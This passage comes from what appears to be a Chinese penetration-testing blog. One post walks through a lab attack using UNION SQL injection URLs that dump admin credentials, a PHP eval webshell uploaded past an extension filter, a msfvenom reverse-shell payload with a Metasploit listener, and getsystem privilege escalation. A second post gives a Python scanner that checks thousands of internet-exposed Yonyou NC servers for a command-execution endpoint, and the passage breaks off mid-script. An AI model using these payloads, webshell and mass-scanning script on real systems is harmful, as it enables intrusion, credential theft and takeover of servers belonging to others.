这个时候我们发现存在sql注入漏洞之后，我们就开始进行查询对方网站数据库的数据，找到一些敏感信息，例如管理员的账号密码等等</p>
<p>首先，我们使用order by语句快速猜解出表中的列数<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CZATPZQ%249%293I4%5DQCRB%7BR9G3.png" alt=""><br>
发现10列的时候报错，说明不足10列，我们继续缩小范围<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/JT6AZ1LLFZHL%4039EJE8OQ3E.png" alt=""><br>
再查询第8列的时候，发现数据回显正确，说明对方表中含有列数8<br>
我们使用union select 自定义查询测试一下，注意我们这里前面的id=10，要写成id=-10，把这里的查询置空<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/W8%25J%40U4%7D%5BD3HFH%7DNFML%25L_7.png" alt=""><br>
发现会分别回显第三列、第五列和第七列。接下来我们就可以在三、五、七处做做文章</p>
<p>查询数据库名字：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.1.167/yxlink/tuku/images.php?id=-10&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EXY%40U7T%25JGYM6%25%7BD0G%29FZF0.png" alt=""><br>
得到数据库名字：qzn_zuiai</p>
<p>查询数据库中的表名：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.1.167/yxlink/tuku/images.php?id=-10&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;qzn_zuiai&quot;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/64LOR%40WXDA7PCL2%5B8%40OWSJG.png" alt=""><br>
得到一共se2admin,se2fl,se2hd,se2nr,se2tufl,se2tunr,se2wz,se2zf,sj3sk九张表<br>
通过表名，我们猜测se2admin可能是存储管理员账号和密码的表，所以我们先查询这张表中的数据</p>
<p>查询表se2admin中的字段：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.1.167/yxlink/tuku/images.php?id=-10&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&quot;se2admin&quot;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/2%24%60DI0KVJHJM5MK_S%29SZ~%40U.png" alt=""><br>
得到表中的字段值有id，name，pass等，接下来我们查询name和pass的字段值</p>
<p>查询字段值：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.1.167/yxlink/tuku/images.php?id=-10&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">name</span>,<span class="number">4</span>,pass,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span> <span class="keyword">from</span> se2admin<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/DNM1KIWQ3~%29TL03T%408%5D9G%60X.png" alt=""><br>
我们得到管理员账号：admin，管理员账号密码：7fef6171469e80d32c0559f88b377245<br>
很显然密码值是被加密的md5值，所以我们去网上找md5网站进行撞库查询<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/N%29%5DIF%40X%25H%29789%7B~MNS6K0%5BY.png" alt=""><br>
得到管理员密码为：admin888<br>
接下来我们需要查找这个网站的后台地址，我们使用御剑进行一个扫描<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/OV8QOF%25%7D6CVVLGW_5TQ1%5DTN.png" alt=""><br>
御剑爆出了很多敏感地址，我们找到一个admin的目录，可能是后台地址，我们去访问一下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/HCYIQ8PD4F%7BU5KVUEVY%7D9WG.png" alt=""><br>
输入我们刚刚得到的管理员账号和密码admin:admin888<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/P%40R%7BB8STI811URPWC%25%40GQ81.png" alt=""><br>
这个时候，我们成功进入对方网站后台。</p>
<h2 id="文件上传漏洞"><a class="header-anchor" href="#文件上传漏洞">¶</a>文件上传漏洞</h2>
<p>接下来我们再这里找到一个文件上传点<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/A%28GNMR3D%29O%60%29AH3MKVRQ20U.png" alt=""><br>
我们写一个简单的一句话木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/H6JI8CKP%256M_8%5BFOZ1_VKUS.png" alt=""><br>
考虑到这里可能会对我们上传的文件进行一个后缀限制，例如只能上传jpg或者png图片格式文件等，所以我们把muma.txt改成muma.jpg格式<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/P0S3ZG_4XI%29%7BGX14%25RQRYUA.png" alt=""><br>
我们开启burpsuite，然后点提交，拦截到我们发送的数据包<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/FK_UC_0%25I%40Q~16XJN7%5B%601CQ.png" alt=""><br>
我们把muma.jpg改回php文件类型：muma.php<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%24%7BRYDZJ0T4EZ%29FABTKYE5%24J.png" alt=""><br>
然后发送数据包<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CC8K%256%7DFP%7DHA%5B2ZUFJP%5DDGE.png" alt=""><br>
ok，已经上传成功，我们去找找我们上传后的路径<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/V8TW%7BRFNJ%40VVQ6ESZK60QYG.png" alt=""><br>
得到我们的上传完整路径为：<code>http://192.168.1.167/yxlink/img/img_3699336993.php</code><br>
我们使用蚁剑进行连接我们上传的木马<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/2_%5DLX62PYEDGHMP%6094SYA%29P.png" alt=""><br>
成功连接，进入到对方服务器<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/QN_%60%5BB%5BTHV18Z1QFL3L%5B9EP.png" alt=""><br>
到此，已成功拿到webshell</p>
<h1>反弹shell连接</h1>
<p>接下来我们利用kali的msf制作一个exe类型的反弹型木马</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=kali的ip LPORT=端口 -f 类型 -o 文件名</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/YDU1EFKR~H3D%28U6OD6X%7DZ%25U.png" alt=""><br>
把做好的木马，通过我们蚁剑刚刚连接的webshell进行上传<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/KUOL~L7CL4S%40%60GJXYIUU%295R.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/L%25%40S3%5DE_A%40CF3_%251DUDNP%5BS.png" alt=""><br>
上传成功后，我们在kali启动msf<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/B%7B%40%40%607%604Y~JIBZFXIR4VC7O.png" alt=""></p>
<p><strong>执行监听</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.131</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/9H%28VN~3CT57WQ1%7DL1MUQ_%7DB.png" alt=""><br>
<strong>执行木马</strong></p>
<p>msf开启监听之后，我们去蚁剑webshell执行我们上传的木马<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%5B%29C3QY%60V%7BV%282%29TRB%40VM7SBH.png" alt=""><br>
执行之后，回到kali，我们可以看到msf目标正在回连，创建Meterpreter会话成功<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/SIL%25NM%29X3G%293%5DZ4%25S1F%28BCF.png" alt=""></p>
<p><strong>提权</strong></p>
<p>首先查看一下我们的用户权限<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%60H_A1%29K4%5DH3FWZ8FHFQDSMP.png" alt=""><br>
发现是普通用户权限，之前我们已经在webshell观察到对方是win7系统，所以我们采用的是windows的载荷攻击<br>
我们尝试使用getsystem进行提权试试<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/6%24I2J%24V91AJ%5D8RJDYHFLMNS.png" alt=""><br>
发现直接提权成功，现在我们拥有windows最高权限system<br>
接下来我们打印一下系统信息，并且拍照对方电脑现在状态<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/J8EE_%249FD%258GQ0%28%257%60%60BX14.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CW%7BXP%7D_1%25%5BI6P8M%40M23J4SQ.png" alt=""><br>
ok，成功。</p>
<h1>结语</h1>
<p>在拿到system权限之后，我们可以干很多很多的事…例如给对方种下后门，拿来当肉鸡等等。。。<br>
这告诉我们开发网站必须注重安全，否则带来的后果是无穷大的。<br>
emmm…这波有点难受。</p>
<p><strong>注：本博客仅供技术研究，若将其信息做其他用途，由用户承担全部法律及连带责任，本博客不承担任何法律及连带责任，请遵守中华人民共和国安全法</strong></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈src漏洞的批量挖掘</title>
    <url>/posts/997/</url>
    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
<p>本篇博文只谈漏洞的利用和批量挖掘。<br>
在接触src之前，我和很多师傅都有同一个疑问，就是那些大师傅是怎么批量挖洞的？摸滚打爬了两个月之后，我渐渐有了点自己的理解和经验，所以打算分享出来和各位师傅交流，不足之处还望指正。</p>
<h2 id="漏洞举例"><a class="header-anchor" href="#漏洞举例">¶</a>漏洞举例</h2>
<p>这里以前几天爆出来的用友nc的命令执行漏洞为例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxxx.xxxx.xxxx&#x2F;servlet&#x2F;&#x2F;~ic&#x2F;bsh.servlet.BshServlet</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%B5%85%E8%B0%88src%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%89%B9%E9%87%8F%E6%8C%96%E6%8E%98/1.png" alt=""></p>
<p>文本框里可以命令执行<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%B5%85%E8%B0%88src%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%89%B9%E9%87%8F%E6%8C%96%E6%8E%98/2.png" alt=""></p>
<h2 id="漏洞的批量检测"><a class="header-anchor" href="#漏洞的批量检测">¶</a>漏洞的批量检测</h2>
<p>在知道这个漏洞详情之后，我们需要根据漏洞的特征去fofa里寻找全国范围里使用这个系统的网站，比如用友nc在fofa的搜索特征就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app&#x3D;&quot;用友-UFIDA-NC&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%B5%85%E8%B0%88src%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%89%B9%E9%87%8F%E6%8C%96%E6%8E%98/3.png" alt=""><br>
可以看到一共有9119条结果，接下来我们需要采集所有站点的地址下来，这里推荐狼组安全团队开发的fofa采集工具fofa-viewer</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">github地址:https:&#x2F;&#x2F;github.com&#x2F;wgpsec&#x2F;fofa_viewer</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%B5%85%E8%B0%88src%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%89%B9%E9%87%8F%E6%8C%96%E6%8E%98/4.png" alt=""><br>
然后导出所有站点到一个txt文件中<br>
根据用友nc漏洞命令执行的特征，我们简单写一个多线程检测脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/5/10 9:16</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url</span>):</span></span><br><span class="line">    poc = <span class="string">r&quot;&quot;&quot;/servlet//~ic/bsh.servlet.BshServlet&quot;&quot;&quot;</span></span><br><span class="line">    url = url + poc</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;BeanShell&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(<span class="string">&quot;[*]存在漏洞的url：&quot;</span> + url)</span><br><span class="line">            <span class="keyword">with</span> open (<span class="string">&quot;用友命令执行列表.txt&quot;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(url + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multithreading</span>(<span class="params">funcname, params=[], filename=<span class="string">&quot;yongyou.txt&quot;</span>, pools=<span class="number">10</span></span>):</span></span><br><span class="line">    works = []</span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">            func_params = [i.rstrip(<span class="string">&quot;\n&quot;</span>)] + params</span><br><span class="line">            works.append((func_params, <span class="literal">None</span>))</span><br><span class="line">    pool = threadpool.ThreadPool(pools)</span><br><span class="line">    reqs = threadpool.makeRequests(funcname, works)</span><br><span class="line">    [pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> reqs]</span><br><span class="line">    pool.wait()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&quot;用友命令执行列表.txt&quot;</span>):</span><br><span class="line">        f = open(<span class="string">&quot;用友命令执行列表.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        f.truncate()</span><br><span class="line">    multithreading(exp, [], <span class="string">&quot;yongyou.txt&quot;</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%B5%85%E8%B0%88src%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%89%B9%E9%87%8F%E6%8C%96%E6%8E%98/5.png" alt=""><br>
运行完后得到所有漏洞站点的txt文件<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%B5%85%E8%B0%88src%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%89%B9%E9%87%8F%E6%8C%96%E6%8E%98/6.png" alt=""></p>
<h2 id="域名和权重的批量检测"><a class="header-anchor" href="#域名和权重的批量检测">¶</a>域名和权重的批量检测</h2>
<p>在我们提交补天等漏洞平台时，不免注意到有这么一个规则，公益漏洞的提交需要满足站点的百度权重或者移动权重大于等于1，亦或者谷歌权重大于等于3的条件，补天漏洞平台以爱站的检测权重为准</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;rank.aizhan.com&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%B5%85%E8%B0%88src%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%89%B9%E9%87%8F%E6%8C%96%E6%8E%98/7.png" alt=""></p>
<p>首先我们需要对收集过来的漏洞列表做一个ip反查域名，来证明归属，我们用爬虫写一个批量ip反查域名脚本<br>
这里用了ip138和爱站两个站点来进行ip反查域名<br>
因为多线程会被ban，目前只采用了单线程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/6/2 22:39</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> re, time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># ip138</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip138_chaxun</span>(<span class="params">ip, ua</span>):</span></span><br><span class="line">    ip138_headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;site.ip138.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: ua.random,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://site.ip138.com/&#x27;</span>&#125;</span><br><span class="line">    ip138_url = <span class="string">&#x27;https://site.ip138.com/&#x27;</span> + str(ip) + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip138_res = requests.get(url=ip138_url, headers=ip138_headers, timeout=<span class="number">2</span>).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&lt;li&gt;暂无结果&lt;/li&gt;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> ip138_res:</span><br><span class="line">            result_site = re.findall(<span class="string">r&quot;&quot;&quot;&lt;/span&gt;&lt;a href=&quot;/(.*?)/&quot; target=&quot;_blank&quot;&gt;&quot;&quot;&quot;</span>, ip138_res)</span><br><span class="line">            <span class="keyword">return</span> result_site</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爱站</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aizhan_chaxun</span>(<span class="params">ip, ua</span>):</span></span><br><span class="line">    aizhan_headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;dns.aizhan.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: ua.random,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://dns.aizhan.com/&#x27;</span>&#125;</span><br><span class="line">    aizhan_url = <span class="string">&#x27;https://dns.aizhan.com/&#x27;</span> + str(ip) + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        aizhan_r = requests.get(url=aizhan_url, headers=aizhan_headers, timeout=<span class="number">2</span>).text</span><br><span class="line">        aizhan_nums = re.findall(<span class="string">r&#x27;&#x27;&#x27;&lt;span class=&quot;red&quot;&gt;(.*?)&lt;/span&gt;&#x27;&#x27;&#x27;</span>, aizhan_r)</span><br><span class="line">        <span class="keyword">if</span> int(aizhan_nums[<span class="number">0</span>]) &gt; <span class="number">0</span>:</span><br><span class="line">            aizhan_domains = re.findall(<span class="string">r&#x27;&#x27;&#x27;rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;(.*?)&lt;/a&gt;&#x27;&#x27;&#x27;</span>, aizhan_r)</span><br><span class="line">            <span class="keyword">return</span> aizhan_domains</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_result</span>(<span class="params">i</span>):</span></span><br><span class="line">    ua_header = UserAgent()</span><br><span class="line">    i = i.strip()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip = i.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;//&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        ip138_result = ip138_chaxun(ip, ua_header)</span><br><span class="line">        aizhan_result = aizhan_chaxun(ip, ua_header)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> ((ip138_result != <span class="literal">None</span> <span class="keyword">and</span> ip138_result!=[]) <span class="keyword">or</span> aizhan_result != <span class="literal">None</span> ):</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">&quot;ip反查结果.txt&quot;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                result = <span class="string">&quot;[url]:&quot;</span> + i + <span class="string">&quot;   &quot;</span> + <span class="string">&quot;[ip138]:&quot;</span> + str(ip138_result) + <span class="string">&quot;  [aizhan]:&quot;</span> + str(aizhan_result)</span><br><span class="line">                print(result)</span><br><span class="line">                f.write(result + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">&quot;反查失败列表.txt&quot;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(i + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url_list = open(<span 